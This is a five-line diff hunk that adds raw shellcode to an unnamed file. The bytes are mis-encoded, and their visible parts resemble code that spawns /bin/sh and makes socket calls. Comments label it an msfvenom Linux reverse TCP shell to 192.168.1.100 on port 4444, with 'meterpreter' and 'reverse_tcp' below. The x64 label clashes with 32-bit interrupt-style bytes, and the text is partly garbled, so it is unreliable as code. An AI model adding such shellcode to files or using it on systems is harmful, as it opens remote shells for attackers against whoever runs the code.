@@ -1,0 +1,5 @@
+1ÀPh//shh/bin‰ãPS‰á°Í€1ÀPhfh\fj‰ájQP‰á°fÍ€
+// msfvenom linux/x64/shell_reverse_tcp
+// LHOST=192.168.1.100 LPORT=4444
+meterpreter
+reverse_tcp
